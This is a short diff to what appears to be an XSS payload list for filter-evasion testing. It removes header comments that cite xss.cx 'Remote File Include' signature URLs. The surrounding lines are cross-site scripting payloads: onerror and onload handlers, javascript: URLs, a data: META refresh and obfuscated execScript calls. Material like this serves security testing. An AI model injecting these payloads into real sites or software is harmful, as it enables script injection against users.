@@ -1,9 +1,3 @@
-/* Remote File Include with HTML TAGS via XSS.Cx  */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-javascript-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-http-header-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-css-injection-signatures-only-fools-dont-use.txt */
-/* Updated September 29, 2014 */
-/* RFI START */
 <img language=vbs src=<b onerror=alert#1/1#>
 <isindex action="javas&Tab;cript:alert(1)" type=image>
 "]<img src=1 onerror=alert(1)>
@@ -1133,4 +1127,3 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 <iframe src="ms-appx-web://microsoft.windows.spartan/%2e%2e%2f%2e%2e%2fTemp/blah.txt">
 <META http-equiv="refresh" content="1;URL=data:text/html,<script>alert(document.domain)</script>">
 <style onload='execScript(/**/"\x61lert&#40 1&#41","j\x61vascript");'>
-/* RFI STOP */
